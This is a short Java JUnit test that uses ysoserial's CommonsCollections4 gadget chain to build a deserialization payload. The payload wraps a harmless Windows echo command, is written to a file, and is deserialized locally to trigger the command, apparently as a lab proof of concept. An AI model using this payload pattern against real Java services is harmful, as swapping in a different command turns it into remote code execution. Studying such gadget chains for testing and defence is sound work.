package com.example;


import org.junit.Test;
import ysoserial.payloads.*;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class YsoTest {
    @Test
    public void test() throws Exception {
        String cmd = "cmd.exe /c echo 11111 > d:/1.txt";
        ObjectPayload<?> payload = CommonsCollections4.class.newInstance();
        Object obj = payload.getObject(cmd);


        //test
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("D:/1.bin"));
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("D:/1.bin"));
        objectInputStream.readObject();

        objectOutputStream.close();
        objectInputStream.close();
    }



}
